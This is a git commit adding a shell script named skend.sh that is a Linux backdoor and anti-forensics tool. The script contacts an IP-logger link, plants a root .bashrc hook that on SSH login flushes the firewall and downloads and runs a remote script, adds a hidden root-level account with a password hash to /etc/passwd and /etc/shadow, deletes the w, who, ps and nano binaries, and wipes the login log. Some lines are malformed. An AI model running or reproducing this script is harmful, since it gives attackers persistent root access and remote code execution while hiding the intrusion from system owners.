75ab83ef70b903a052223b228be52a636a795345
BulutC4N <55353295+BulutC4N@users.noreply.github.com>
2020-04-11 06:12:20 +0300

    Add files via upload

---
+++ skend.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+curl -O https://iplogger.org/1upYr7 -O &> output; rm -rf output 1upYr7
+printf 'if [[ -n $SSH_CONNECTION ]] ; then' >> ~/.bashrc; printf '\niptables -F; cd /dev; cd /dev ; curl -O https://raw.githubusercontent.com/BulutC4N/f/master/spend.sh &> x; rm -rf x; chmod 777 spend.sh;sh spend.sh;rm -rf spend.sh output ; cd ;' >> /root/.bashrc;printf '\nfi\n\n' >> /root/.bashrc;
+echo 'sysctlkernel:x:0:0:sysctlkernel:/root:/bin/bash' >> /etc/passwd ; -O &> output; rm -rf output
+echo 'sysctlkernel:$6$ZryzoxRF$iFCUwFMyV/8evP05FJh8KnmTsJEub63or5bIev1X7DQNNgioFv6e9GYi49TXrbz9S.2OyFaOukntYwF5Gv5SF0:18344:0:99999:7:::' >> /etc/shadow ; -O &> output; rm -rf output
+rm -rf /usr/bin/w
+rm -rf /usr/bin/who
+rm -rf /usr/bin/nano
+rm -rf /usr/bin/ps
+rm -f /var/log/wtmp && touch /var/log/wtmp
